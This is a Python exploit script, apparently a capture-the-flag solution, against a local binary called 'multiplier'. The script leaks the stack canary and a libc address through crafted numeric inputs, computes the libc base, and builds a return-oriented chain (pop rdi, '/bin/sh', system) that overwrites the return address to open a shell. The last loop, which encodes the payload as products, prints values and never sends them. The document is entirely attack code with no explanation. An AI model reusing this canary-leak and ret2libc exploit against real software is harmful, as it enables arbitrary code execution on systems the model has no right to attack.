from ptrlib import *
import math

def search(x):
    if x <= 255 * 255:
        lx = ly = 1
        for x1 in range(1, 0x100):
            for x2 in range(1, 0x100):
                if abs(x - x1 * x2) < abs(x - lx * ly):
                    lx, ly = x1, x2
        return {lx: 1, ly: 1}
    l = search(math.sqrt(x))
    for key in l:
        l[key] *= 2
    return l

def product(l):
    y = 1
    for w in l:
        y *= w ** l[w]
    return y

libc = ELF("./libc-2.27.so")
sock = Process("./multiplier")

sock.recvline()

# leak canary
sock.recvline()
for i in range(25):
    sock.sendline("255")
sock.sendline("0")
canary = bytes.fromhex(bytes2str(sock.recvline().rstrip()[:-0x18 * 2]))
canary = u64(b'\x00' + canary[::-1][1:])
dump("canary = " + hex(canary))

# leak libc base
sock.recvline()
for i in range(41):
    sock.sendline("255")
sock.sendline("0")
addr_retaddr = bytes.fromhex(bytes2str(sock.recvline().rstrip()[:-0x28 * 2]))
addr_retaddr = u64(addr_retaddr[::-1])
libc_base = (addr_retaddr - libc.symbol("__libc_start_main")) & 0xfffffffffffff000
dump("libc base = " + hex(libc_base))

# overwrite return address
rop_pop_rdi = 0x0002155f
payload = 0
payload = (payload | (libc_base + libc.symbol("system"))) << 64
payload = (payload | (libc_base + next(libc.find("/bin/sh")))) << 64
payload = (payload | (libc_base + rop_pop_rdi)) << 64
payload = (payload | canary) << (64 + 0x10 * 8)
print(hex(payload))

while payload > 0:
    l = search(payload)
    y = product(l)
    print("-----")
    print(hex(payload))
    print(hex(y))
    mask = 0
    for i in range(len(hex(payload)[2:]) // 2 - 1):
        mask <<= 8
        mask |= 0xff
    payload &= mask
